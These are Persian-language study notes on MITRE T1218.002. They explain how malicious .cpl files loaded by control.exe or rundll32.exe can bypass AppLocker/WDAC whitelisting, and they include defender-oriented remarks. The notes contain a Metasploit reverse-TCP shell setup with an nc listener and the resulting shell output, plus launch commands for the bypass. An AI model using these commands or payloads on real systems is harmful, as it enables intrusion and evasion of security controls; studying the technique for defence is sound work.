
https://attack.mitre.org/techniques/T1218/002/
ID: T1218.002


یکی دیگر از روش های bypass کردن applocker استفاده از برنامه هایی با پسوند .cpl هستند این نوع فایل ها از نظر فنی dll هستند که مربوط به  Control Panel Item هستند که یک یا چند تابع خاص (مانند `CPlApplet`) را صادر می‌کنند.
وقتی کاربر یا سیستم Control Panel را باز می‌کند، یا وقتی `control.exe`/`rundll32.exe`/فرمان‌های مشابه استفاده می‌شوند، ویندوز این فایل را بارگذاری و تابع صادرشده را فراخوانی می‌کند.

دلیلِ جذابیت برای مهاجم: اجرای کد داخل یک DLL که توسط یک باینری ویندوزی (مثل `control.exe` یا `explorer.exe`) بارگذاری می‌شود، یعنی کد مخرب با فرآیندِ والد/باینری‌ای اجرا می‌شود که معمولاً در لیست‌های سفید قرار دارد یا امضای معتبر دارد — این همان مکانیسم bypass است.

سیستم‌های WHitelisting (مثل AppLocker یا WDAC) معمولاً اجازهٔ اجرای باینری‌های مشخص‌شده را می‌دهند (مثلاً `control.exe`, `explorer.exe`, `rundll32.exe`).

```
msfconsole
use windows/local/cve_2017_8464_lnk_lpe
set payload windows/x64/shell_reverse_tcp
set lhost 10.0.0.5
exploit

root@~# nc -lvp 4444
listening on [any] 4444 ...
```


# DllMain چیه؟ (خلاصهٔ یک‌خطی)

`DllMain`
تابع **نقطهٔ ورود (entry point)** یک DLL در ویندوز است که وقتی DLL لود یا آنلود می‌شود یا وقتی تردها ساخته/متوقف می‌شن، توسط لودر ویندوز فراخوانی می‌گردد.

---

# چه زمانی فراخوانی می‌شود؟

ویندوز بسته به رویدادِ زیر، `DllMain` را صدا می‌زند (و پارامتر دوم را بر اساس آن مقدار می‌دهد):

- `DLL_PROCESS_ATTACH` — وقتی DLL به یک پروسس **بارگذاری** می‌شود (مثلاً `LoadLibrary`, implicit load در زمان process start، یا وقتی پروسس بارگذاری می‌کند).
    
- `DLL_THREAD_ATTACH` — وقتی یک ترد جدید در همان پروسس ساخته می‌شود.
    
- `DLL_THREAD_DETACH` — وقتی یک ترد خاتمه می‌یابد.
    
- `DLL_PROCESS_DETACH` — وقتی DLL از پروسس **آزاد** می‌شود (مثلاً `FreeLibrary` یا زمان خروج پروسس).


```
control.exe .\FlashPlayerCPLApp.cpl
# or
rundll32.exe shell32.dll,Control_RunDLL file.cpl
# or
rundll32.exe shell32.dll,Control_RunDLLAsUser file.cpl
```

```
10.0.0.2: inverse host lookup failed: Unknown host
connect to [10.0.0.5] from (UNKNOWN) [10.0.0.2] 49346
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
```


# چی هست shell32.dll؟ (خلاصه‌ی یک‌خطی)

`shell32.dll` یک کتابخانهٔ دینامیک اصلیِ ویندوزه که توابع و کامپوننت‌های مربوط به **Windows Shell** (مثل مدیریت فایل، تعامل با Explorer، نمایش منوها/آیکن‌ها، باز/اجرا کردن فایل‌ها و مسیرهای سیستمی) رو فراهم می‌کنه.

# نقش و مسئولیت‌ها (چه کارهایی انجام می‌ده)

- فراهم‌کردن APIهای سطح بالا برای کار با شِل ویندوز: باز کردن فایل/پوشه، نمایش دیالوگ‌ها، مانور روی شورتکات‌ها، آیکن‌ها، context menu و موارد مشابه.
    
- wrapper یا پیاده‌سازِ توابعی مثل `ShellExecute`, `ShellExecuteEx`, `SHGetFolderPath`, `SHCreateItemFromParsingName` و غیره.


## ) `control.exe .\FlashPlayerCPLApp.cpl`

### چه کار می‌کند (فنی)

- `control.exe` برنامهٔ رسمی ویندوز برای باز کردن Control Panel است.
    
- وقتی `control.exe` یک آرگومان با پسوند `.cpl` می‌گیرد (مسیر نسبی یا مطلق)، آن را بارگذاری می‌کند (معمولاً با `LoadLibrary`) و تابع صادره مرتبط با آن ماژول (مثل `CPlApplet`) را فراخوانی می‌کند تا رابط/قابلیت کنترل پنل نمایش داده شود.
    
- در این مثال، `.\FlashPlayerCPLApp.cpl` مسیر فایل CPL را نسبت به دایرکتوری جاری مشخص می‌کند — یعنی control.exe آن فایل را در فرآیند `control.exe` بارگذاری و اجرا می‌کند.
    

### نکات مهم

- فایل `.cpl` از لحاظ فنی یک DLL است؛ بنابراین هر کدی که داخل آن باشد با زمینهٔ `control.exe` اجرا خواهد شد.
    
- مسیرِ فایل می‌تواند نسبی یا مطلق باشد؛ اگر مسیر مربوطه قابل‌نوشتن توسط کاربر باشد، این یک بردار احتمالی برای سوءاستفاده است (کاربر می‌تواند فایل دلخواه را آنجا قرار دهد و control.exe آن را بارگذاری کند).
    

---

## 2) `rundll32.exe shell32.dll,Control_RunDLL file.cpl`

### چه کار می‌کند (فنی)

- `rundll32.exe` ابزاری برای اجرای توابع صادرشده در یک DLL است. فرم کلی:  
    `rundll32.exe <DLL>,<ExportedFunction> <arguments...>`
    
- `shell32.dll,Control_RunDLL` بدین معنی است که `rundll32.exe` تابع `Control_RunDLL` را از `shell32.dll` صدا می‌زند، و به آن `file.cpl` را به عنوان آرگومان می‌دهد.
    
- تابع `Control_RunDLL` در shell32 وظیفهٔ راه‌اندازی و نمایش آیتم‌های Control Panel را دارد؛ آن معمولاً `LoadLibrary(file.cpl)` و سپس فراخوانی تابع صادراتی داخل CPL را انجام می‌دهد.
    

### تفاوت با `control.exe`

- `control.exe` یک wrapper مخصوص Control Panel است؛ `rundll32.exe` یک اجراکنندهٔ عمومی برای توابع DLL است.
    
- در هر دو حالت، فایل `.cpl` در فضای فرآیندِ `rundll32.exe` (یا `control.exe`) بارگذاری می‌شود.
    

---

## 3) `rundll32.exe shell32.dll,Control_RunDLLAsUser file.cpl`

### چه کار می‌کند (فنی)

- مشابه مورد قبلی است اما از تابع `Control_RunDLLAsUser` استفاده می‌کند که برای فراخوانی Control Panel item با زمینه‌ی کاربری (user context) خاص طراحی شده — مثلاً برای اجرا به‌عنوان کاربر دیگر یا برای حفظ برخی مجوزها.
    
- بسته به پیاده‌سازی، ممکن است رفتارهای مخصوص سشن/توکن کاربر را لحاظ کند.
    

---

## نکات فنی تکمیلی (مفید برای مدافعان و تحلیلگرها)

- `.cpl`ها همان ساختار PE/DLL را دارند؛ می‌توانند Export داشته باشند (مثل `CPlApplet`) که توسط Control_RunDLL یا خود Control Panel فراخوانی می‌شود.
    
- `rundll32.exe` فقط می‌تواند توابعی را اجرا کند که به امضای مورد انتظارش (معمولاً `void CALLBACK func(HWND, HINSTANCE, LPSTR, int)`) نزدیک باشند — اما wrapperهایی مانند `Control_RunDLL` خودشان رفتار بارگذاری را مدیریت می‌کنند.
    
- اگر مسیر به فایل `.cpl` از فولدرهایی باشد که کاربر عادی می‌تواند در آن بنویسد (`%TEMP%`, دسکتاپ، پوشه پروفایل کاربر) خطر بالا می‌رود.
    

---

## پیامدهای امنیتی (چرا باید حساس باشیم)

- اجرای `.cpl` با `control.exe` یا `rundll32.exe` باعث می‌شود کدِ آن `.cpl` با زمینهٔ فرآیندِ ویندوزیِ معتبر اجرا شود — یعنی ممکن است از لیست‌های سفید (AppLocker/WDAC) عبور کند یا نشان اعتبار باینری/فرآیندِ والد را داشته باشد.
    
- مهاجم‌ها ممکن است یک فایل `.cpl` مخرب روی مسیرهای قابل‌نوشتن قرار دهند و سپس آن را توسط این باینری‌ها فراخوانی کنند تا اجرای کد با حقوق یا سیگنی که آن باینری دارد انجام شود.